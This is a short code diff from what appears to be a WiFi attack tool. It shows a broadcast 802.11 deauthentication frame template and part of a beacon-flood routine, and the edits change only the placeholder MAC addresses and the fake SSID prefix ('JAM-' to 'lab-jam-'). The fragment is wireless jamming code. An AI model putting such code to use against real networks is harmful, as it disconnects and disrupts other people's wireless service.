@@ -21,8 +21,8 @@ const uint8_t deauthFrame[] = {
   0xC0, 0x00,                      // Type: Deauthentication
   0x3A, 0x01,                      // Duration
   0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,  // Destination: Broadcast
-  0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF, // Source (overwritten)
-  0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF, // BSSID (overwritten)
+  0x00, 0x11, 0x22, 0x33, 0x44, 0x55, // Source (overwritten)
+  0x00, 0x11, 0x22, 0x33, 0x44, 0x55, // BSSID (overwritten)
   0x00, 0x00,                      // Sequence control
   0x07, 0x00                       // Reason code
 };
@@ -246,7 +246,7 @@ void sendBeaconFlood() {
   // SSID element
   beacon[pos++] = 0x00;  // SSID tag
   char ssid[20];
-  snprintf(ssid, sizeof(ssid), "JAM-%02X-%d", mac[4], random(0, 255));
+  snprintf(ssid, sizeof(ssid), "lab-jam-%02X-%d", mac[4], random(0, 255));
   beacon[pos++] = strlen(ssid);
   memcpy(&beacon[pos], ssid, strlen(ssid));
   pos += strlen(ssid);
